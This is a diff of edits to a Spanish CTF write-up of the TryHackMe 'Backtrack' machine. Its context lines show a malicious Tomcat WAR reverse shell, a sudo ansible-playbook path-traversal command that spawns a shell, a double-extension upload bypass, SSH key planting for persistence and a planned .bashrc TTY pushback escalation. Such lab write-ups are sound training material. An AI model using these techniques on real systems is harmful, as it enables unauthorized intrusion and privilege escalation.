@@ -46,7 +46,7 @@ PORT     STATE SERVICE         VERSION
 |     <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Lato:400,700">
 ```
 
-###### Nota: Esta máquina da bastantes problemas al cabo de 30 minutos, se vuelve muy lenta e inestable, de ahí la diferencia de direcciones IP
+*Nota: Esta máquina da bastantes problemas al cabo de 30 minutos, se vuelve muy lenta e inestable, de ahí la diferencia de direcciones IP*
 
 Accedemos al sitio web por el puerto 8080, encontramos la página por defecto de Apache Tomcat:
 ![](../assets/img/backtrack-tryhackme-writeup/1.png)
@@ -142,7 +142,7 @@ OK - Deployed application at context path [/m3n0s.war]
 Nos ponemos en escucha al puerto 443 y accedemos a la ruta de nuestro fichero *WAR* malicioso, logramos ganar acceso a la máquina con el usuario *Tomcat*:
 ![](../assets/img/backtrack-tryhackme-writeup/6.png)
 
-Una vez dentro, buscamos el fichero flag1.txt y leemos su contenido:
+Una vez dentro, buscamos el fichero *flag1.txt* y leemos su contenido:
 ```
 tomcat@Backtrack:/$ find / -name flag1.txt 2>/dev/null
 find / -name flag1.txt 2>/dev/null
@@ -178,7 +178,7 @@ User tomcat may run the following commands on Backtrack:
     (wilbur) NOPASSWD: /usr/bin/ansible-playbook /opt/test_playbooks/*.yml
 ```
 
-Este tipo de escalada de privilegios nos pueden sonar de otras máquinas, también hay información en [Gtfobins](https://gtfobins.github.io/gtfobins/ansible-playbook/), pero no tenemos acceso a la ruta *"/opt/test_playbooks*", pero al llevar '*', esto nos permite hacer un path traversal para que ejecute un *.yml* malicioso y generado por nosotros.
+Este tipo de escalada de privilegios nos pueden sonar de otras máquinas, también hay información en [Gtfobins](https://gtfobins.github.io/gtfobins/ansible-playbook/), pero no tenemos acceso a la ruta *"/opt/test_playbooks*", pero al llevar asterisco, esto nos permite hacer un path traversal para que ejecute un *.yml* malicioso y generado por nosotros.
 ```
 tomcat@Backtrack:/dev/shm$ echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' > /dev/shm/m3.yml   
 echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' > /dev/shm/m3.yml
@@ -259,10 +259,10 @@ Accedemos al sitio web, utilizamos las credenciales de *Orville* e identificamos
 Probamos a subir una reverse shell con un fichero PHP, pero no nos lo van a poner tan fácil, debido a que el aplicativo contempla una protección que impide subir ficheros que no sean de tipo imagen:
 ![](../assets/img/backtrack-tryhackme-writeup/8.png)
 
-Evidenciamos que la protección se activa en la extensión del fichero y no el tipo de contenido, también detectamos que la protección no actúa si existe una extensión al principio del fichero (Ej. fichero*.png*.php):
+Evidenciamos que la protección se activa en la extensión del fichero y no el tipo de contenido, también detectamos que la protección no actúa si existe una extensión permitida al principio del fichero (Ej. fichero*.png*.php):
 ![](../assets/img/backtrack-tryhackme-writeup/9.png)
 
-Pero aún logrando subir el fichero, este no se puede ejecutar y es descargado como un binario:
+Pero aún logrando subir el fichero, éste no se puede ejecutar y es descargado como un binario:
 ![](../assets/img/backtrack-tryhackme-writeup/10.png)
 
 Buscamos y leemos el fichero de configuración de **apache2**, vemos que hay una directiva que impide ejecutar código PHP sobre el directorio "*uploads*", por eso es tratado como un binario descargable:
@@ -339,8 +339,7 @@ THM{**************************}
 orville@Backtrack:/var/www/html$ 
 ```
 
-###### Nota: Como no encontramos credenciales del usuario *Orville*, creamos la carpeta *.ssh* y el fichero *authorized_keys* con nuestra clave pública, con la idea de tener una conexión más estable (ya que la máquina va peor por cada minuto que pasa :()
-
+*Nota: Como no encontramos credenciales del usuario *Orville*, creamos la carpeta *.ssh* y el fichero *authorized_keys* con nuestra clave pública, con la idea de tener una conexión más estable (ya que la máquina va peor por cada minuto que pasa :()*
 
 ## Escalada de privilegios
 Ya no quedan más usuarios, solo root, tampoco vemos más información en el home, aunque nos llama la atención el fichero "*web_snapshot.zip*", parece una copia de seguridad.
@@ -361,7 +360,7 @@ lrwxrwxrwx 1    0    0     9 Mar  9  2024 .mysql_history -> /dev/null
 Ejecutamos [**pspy**](https://github.com/DominicBreuker/pspy), vemos que hay un bloque de procesos que se está ejecutando cada cierto tiempo, este proceso involucra la backup del fichero "*web_snapshot.zip*". También se muestra arriba que el usuario *root (UID=0)* tiene una sesión interactiva abierta, tras otra sesión interactiva del usuario Orville, por lo que podría desencadenar un ataque *TTY Pushback*.
 ![](../assets/img/backtrack-tryhackme-writeup/14.png)
 
-La idea es la siguiente, en ambas sesiones se va a ejecutar el fichero "*.bashrc*", por lo que si logramos inyectar código malicioso, conseguiríamos que el usuario root lo ejecute al abrir su sesión interactiva en el proceso automatizado.
+La idea es la siguiente, en ambas sesiones se va a ejecutar el fichero "*.bashrc*", por lo que si logramos inyectar código malicioso en él conseguiríamos que el usuario root lo ejecute al abrir su sesión interactiva en el proceso automatizado.
 
 Creamos un fichero *m3.sh* con el siguiente contenido, esto nos permitirá disponer de una bash con permisos administrativo:
 ```
